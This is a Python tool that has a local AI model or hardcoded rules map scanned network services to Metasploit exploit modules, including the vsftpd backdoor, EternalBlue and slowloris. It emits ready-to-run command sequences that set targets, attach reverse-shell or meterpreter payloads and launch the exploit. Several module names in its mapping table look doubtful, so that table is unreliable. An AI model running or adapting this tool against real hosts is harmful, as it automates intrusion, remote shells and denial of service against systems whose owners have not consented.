#!/usr/bin/env python3
"""
Enhanced Metasploit Exploit Finder with Local AI (Ollama)
Finds relevant Metasploit exploits for discovered services using local AI models
"""

import os
import sys
import json
from typing import Dict, Any, List, Optional

# Add the path to import local_ai_system
current_dir = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, current_dir)

try:
    from local_ai_system import local_ai
    LOCAL_AI_AVAILABLE = True
    print("ü§ñ Local AI system loaded successfully")
except ImportError as e:
    print(f"‚ö†Ô∏è Local AI not available: {e}")
    LOCAL_AI_AVAILABLE = False


def find_metasploit_exploit(service_data: Dict[str, Any]) -> Dict[str, Any]:
    """
    Find Metasploit exploit using local AI models
    
    Args:
        service_data: Dictionary containing service information
        
    Returns:
        Dictionary with exploit module, payload, and commands
    """
    
    service = service_data.get('service', 'unknown')
    product = service_data.get('product', 'unknown')
    version = service_data.get('version', 'unknown')
    port = service_data.get('port', 'unknown')
    host = service_data.get('host', service_data.get('ip', 'unknown'))
    
    print(f"üîç Finding exploit for: {service} {product} {version} (Port {port})")
    
    # Try local AI first
    if LOCAL_AI_AVAILABLE:
        try:
            result = local_ai.generate_metasploit_exploit(service_data)
            
            if result and not result.get('error'):
                print(f"ü§ñ Using LOCAL AI recommendation")
                return result
            else:
                print(f"‚ö†Ô∏è Local AI failed: {result.get('error', 'Unknown error')}")
                print(f"üîÑ Falling back to rule-based matching...")
                
        except Exception as e:
            print(f"‚ùå Local AI error: {e}")
            print(f"üîÑ Falling back to rule-based matching...")
    else:
        print(f"üîÑ Local AI not available, using rule-based matching...")
    
    # Fallback to rule-based matching
    print(f"üìã Using FALLBACK RULES for analysis")
    return get_fallback_exploit(service_data)


def get_fallback_exploit(service_data: Dict[str, Any]) -> Dict[str, Any]:
    """
    Fallback function with hardcoded exploit mappings
    Now properly categorizes vulnerability types
    """
    
    service = service_data.get('service', '').lower()
    product = service_data.get('product', '').lower()
    version = service_data.get('version', '').lower()
    port = service_data.get('port', 0)
    host = service_data.get('host', service_data.get('ip', 'TARGET_IP'))
    
    # Known exploit mappings with vulnerability type classification
    exploit_mappings = {
        # RCE Vulnerabilities - Use exploit/ modules with payloads
        ('ftp', 'vsftpd', '2.3.4'): {
            'exploit_module': 'exploit/unix/ftp/vsftpd_234_backdoor',
            'payload': 'payload/cmd/unix/interact',
            'vulnerability_type': 'RCE',
            'reasoning': 'vsftpd 2.3.4 contains a backdoor vulnerability allowing RCE'
        },
        ('ftp', 'proftpd', '1.3.0'): {
            'exploit_module': 'exploit/linux/ftp/proftp_sreplace',
            'payload': 'payload/linux/x86/shell_reverse_tcp',
            'vulnerability_type': 'RCE',
            'reasoning': 'ProFTPD 1.3.0 vulnerable to sreplace buffer overflow (RCE)'
        },
        ('ssh', 'openssh', '2.3'): {
            'exploit_module': 'exploit/linux/ssh/openssh_useradd',
            'payload': 'payload/linux/x86/shell_reverse_tcp',
            'vulnerability_type': 'RCE',
            'reasoning': 'OpenSSH 2.3 vulnerable to useradd exploit (RCE)'
        },
        ('netbios-ssn', 'samba', '3.0.20'): {
            'exploit_module': 'exploit/linux/samba/lsa_transnames_heap',
            'payload': 'payload/linux/x86/shell_reverse_tcp',
            'vulnerability_type': 'RCE',
            'reasoning': 'Samba 3.0.20 LSA transnames heap overflow (RCE)'
        },
        ('microsoft-ds', 'samba', '3.0.20'): {
            'exploit_module': 'exploit/linux/samba/lsa_transnames_heap',
            'payload': 'payload/linux/x86/shell_reverse_tcp',
            'vulnerability_type': 'RCE',
            'reasoning': 'Samba 3.0.20 LSA transnames heap overflow (RCE)'
        },
        ('http', 'apache', '2.2'): {
            'exploit_module': 'exploit/linux/http/apache_mod_rewrite_ldap',
            'payload': 'payload/linux/x86/shell_reverse_tcp',
            'vulnerability_type': 'RCE',
            'reasoning': 'Apache 2.2.x mod_rewrite LDAP vulnerability (RCE)'
        },
        ('mysql', 'mysql', '5.'): {
            'exploit_module': 'exploit/linux/mysql/mysql_yassl_hello',
            'payload': 'payload/linux/x86/shell_reverse_tcp',
            'vulnerability_type': 'RCE',
            'reasoning': 'MySQL 5.x yaSSL buffer overflow (RCE)'
        },
        ('microsoft-ds', 'microsoft', ''): {
            'exploit_module': 'exploit/windows/smb/ms17_010_eternalblue',
            'payload': 'payload/windows/x64/meterpreter/reverse_tcp',
            'vulnerability_type': 'RCE',
            'reasoning': 'EternalBlue SMB vulnerability (MS17-010) - RCE'
        },
        
        # DOS Vulnerabilities - Only verified modules, be conservative
        ('http', 'apache', 'range'): {
            'exploit_module': 'MODULE_NOT_AVAILABLE',
            'payload': 'NOT_APPLICABLE',
            'vulnerability_type': 'DOS',
            'reasoning': 'No verified Apache range DOS module in current Metasploit Framework'
        },
        ('http', 'nginx', 'slowloris'): {
            'exploit_module': 'auxiliary/dos/http/slowloris',
            'payload': 'NO_PAYLOAD',
            'vulnerability_type': 'DOS',
            'reasoning': 'Slowloris DOS attack - verified module for HTTP DOS'
        },
        ('http', '', 'slowloris'): {
            'exploit_module': 'auxiliary/dos/http/slowloris',
            'payload': 'NO_PAYLOAD',
            'vulnerability_type': 'DOS',
            'reasoning': 'Generic HTTP slowloris DOS attack - verified module'
        },
        ('smb', 'samba', 'dos'): {
            'exploit_module': 'MODULE_NOT_AVAILABLE',
            'payload': 'NOT_APPLICABLE',
            'vulnerability_type': 'DOS',
            'reasoning': 'No verified SMB DOS module available for this service'
        },
        
        # Information Disclosure - Use auxiliary/scanner/ modules
        ('ssh', 'openssh', 'enum'): {
            'exploit_module': 'auxiliary/scanner/ssh/ssh_version',
            'payload': 'NO_PAYLOAD',
            'vulnerability_type': 'INFO_DISCLOSURE',
            'reasoning': 'SSH version enumeration - information disclosure only'
        },
        ('http', 'apache', 'info'): {
            'exploit_module': 'auxiliary/scanner/http/apache_server_info',
            'payload': 'NO_PAYLOAD',
            'vulnerability_type': 'INFO_DISCLOSURE',
            'reasoning': 'Apache server information disclosure'
        },
        
        # Authentication Bypass - Use auxiliary/scanner/ or exploit/
        ('ftp', 'anonymous', ''): {
            'exploit_module': 'auxiliary/scanner/ftp/anonymous',
            'payload': 'NO_PAYLOAD',
            'vulnerability_type': 'AUTH_BYPASS',
            'reasoning': 'FTP anonymous login - authentication bypass'
        },
        
        # Default/Generic - Only when no specific match
        ('telnet', '', ''): {
            'exploit_module': 'MODULE_NOT_AVAILABLE',
            'payload': 'NOT_APPLICABLE',
            'vulnerability_type': 'OTHER',
            'reasoning': 'No specific Metasploit module available for this telnet service'
        }
    }
    
    # Try to find exact match
    for (srv, prod, ver), exploit_info in exploit_mappings.items():
        if (srv in service and 
            (not prod or prod in product) and 
            (not ver or ver in version)):
            
            exploit_module = exploit_info['exploit_module']
            payload = exploit_info['payload']
            vuln_type = exploit_info['vulnerability_type']
            reasoning = exploit_info['reasoning']
            
            # Handle case where no module is available
            if exploit_module == 'MODULE_NOT_AVAILABLE':
                print(f"‚ö†Ô∏è No specific Metasploit module available for this service")
                return {
                    'exploit_module': 'MODULE_NOT_AVAILABLE',
                    'payload': 'NOT_APPLICABLE',
                    'vulnerability_type': vuln_type,
                    'confidence': 'high',
                    'reasoning': reasoning,
                    'target_info': {
                        'RHOSTS': host,
                        'RPORT': port
                    },
                    'commands': [
                        "# No Metasploit module available for this vulnerability",
                        "# Consider manual exploitation or alternative tools",
                        f"# Target: {host}:{port} ({service} {product} {version})"
                    ],
                    'ai_source': 'fallback_rules'
                }
            
            # Build appropriate commands based on vulnerability type
            commands = []
            
            if vuln_type == 'DOS' or vuln_type == 'INFO_DISCLOSURE' or vuln_type == 'AUTH_BYPASS':
                # Auxiliary modules - no payload needed
                commands = [
                    f"use {exploit_module}",
                    f"set RHOSTS {host}",
                    f"set RPORT {port}",
                    "run"
                ]
            elif vuln_type == 'RCE':
                # Exploit modules - need payloads
                commands = [
                    f"use {exploit_module}",
                    f"set RHOSTS {host}",
                    f"set RPORT {port}",
                    f"set payload {payload}",
                    "set LHOST YOUR_IP",
                    "set LPORT 4444",
                    "check",
                    "exploit"
                ]
            else:
                # Unknown type - generic approach
                commands = [
                    f"use {exploit_module}",
                    f"set RHOSTS {host}",
                    f"set RPORT {port}",
                    "run"
                ]
            
            # Add vulnerability type emoji for logging
            vuln_type_emoji = {
                'RCE': 'üí•',
                'DOS': 'üí£', 
                'INFO_DISCLOSURE': 'üîç',
                'AUTH_BYPASS': 'üîì',
                'PRIVILEGE_ESCALATION': '‚¨ÜÔ∏è',
                'OTHER': '‚ùì'
            }.get(vuln_type, '‚ùì')
            
            print(f"‚úÖ Fallback match: {exploit_module} {vuln_type_emoji} ({vuln_type})")
            
            return {
                'exploit_module': exploit_module,
                'payload': payload,
                'vulnerability_type': vuln_type,
                'confidence': 'medium',
                'reasoning': reasoning,
                'target_info': {
                    'RHOSTS': host,
                    'RPORT': port
                },
                'commands': commands,
                'ai_source': 'fallback_rules'
            }
    
    # No specific match found
    print("‚ö†Ô∏è No specific exploit mapping found, module not available")
    
    return {
        'exploit_module': 'MODULE_NOT_AVAILABLE',
        'payload': 'NOT_APPLICABLE',
        'vulnerability_type': 'OTHER',
        'confidence': 'low',
        'reasoning': 'No specific Metasploit module available for this service/version combination',
        'target_info': {
            'RHOSTS': host,
            'RPORT': port
        },
        'commands': [
            "# No specific Metasploit module available",
            "# Manual analysis and exploitation required",
            f"# Target: {host}:{port} ({service} {product} {version})",
            "# Consider using nmap scripts, custom exploits, or manual testing"
        ],
        'ai_source': 'no_match_fallback'
    }


def analyze_exploits_with_ai(exploits_data: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Analyze multiple exploits and add AI suggestions
    """
    
    if not LOCAL_AI_AVAILABLE:
        print("‚ö†Ô∏è Local AI not available for exploit analysis")
        return exploits_data
    
    enhanced_exploits = []
    
    for exploit_data in exploits_data:
        try:
            # Extract service information
            service_info = {
                'service': exploit_data.get('service', 'unknown'),
                'product': exploit_data.get('product', 'unknown'),  
                'version': exploit_data.get('version', 'unknown'),
                'port': exploit_data.get('port', 'unknown'),
                'host': exploit_data.get('host', exploit_data.get('ip', 'unknown'))
            }
            
            # Get AI suggestion
            ai_suggestion = find_metasploit_exploit(service_info)
            
            # Add AI suggestion to exploit data
            exploit_data['ai_suggestion'] = ai_suggestion
            enhanced_exploits.append(exploit_data)
            
        except Exception as e:
            print(f"‚ùå Error analyzing exploit: {e}")
            exploit_data['ai_suggestion'] = {'error': str(e)}
            enhanced_exploits.append(exploit_data)
    
    return enhanced_exploits


# Test function
def test_exploit_finder():
    """Test the exploit finder with sample data"""
    
    test_cases = [
        {
            'service': 'ftp',
            'product': 'vsftpd', 
            'version': '2.3.4',
            'port': 21,
            'host': '192.168.1.100'
        },
        {
            'service': 'ssh',
            'product': 'openssh',
            'version': '7.4',
            'port': 22,
            'host': '192.168.1.100'
        },
        {
            'service': 'http',
            'product': 'apache',
            'version': '2.2.8',
            'port': 80,
            'host': '192.168.1.100'
        }
    ]
    
    print("üß™ Testing exploit finder...")
    
    for i, test_case in enumerate(test_cases, 1):
        print(f"\n--- Test Case {i} ---")
        result = find_metasploit_exploit(test_case)
        print(f"Result: {result.get('exploit_module', 'None')}")
        print(f"Confidence: {result.get('confidence', 'Unknown')}")
        print(f"Source: {result.get('ai_source', 'Unknown')}")


if __name__ == "__main__":
    test_exploit_finder()
